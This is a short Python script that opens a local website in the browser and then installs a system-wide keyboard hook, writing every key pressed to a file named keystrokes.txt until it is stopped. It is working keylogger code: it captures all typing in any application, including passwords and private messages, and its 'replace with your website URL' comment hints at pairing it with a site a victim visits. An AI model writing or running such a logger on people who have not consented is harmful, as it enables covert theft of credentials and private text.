import keyboard
import webbrowser

log_file = 'keystrokes.txt'

# Open the website
webbrowser.open("http://127.0.0.1:5000/")  # Replace with your website URL

# Function to log keystrokes
def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

# Start listening for key presses
keyboard.on_press(on_key_press)
keyboard.wait()
